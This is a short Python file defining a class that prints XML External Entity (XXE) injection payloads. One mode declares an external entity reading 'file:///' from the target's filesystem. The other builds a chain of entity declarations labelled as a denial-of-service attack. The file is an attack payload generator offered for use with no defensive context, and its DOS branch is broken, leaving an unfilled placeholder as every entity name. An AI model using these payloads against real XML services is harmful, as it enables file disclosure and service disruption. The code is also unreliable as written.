import xml

class xxe_builder:

    def __init__(self,motive,entity):
        self.__motive = motive
        self.__entity = entity

    def generate_injections(self):
        
        text = ""

        if self.__motive == "injection":
            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM "file:///">]>'.format(str(self.__entity))
            print(text)
        elif self.__motive == "DOS":
            text = '<!DOCTYPE foo ['
            for i in range(0, 10):
                text = text + '<!ENTITY {} SYSTEM "file:///">';
            final = text + ']>'
            print(final)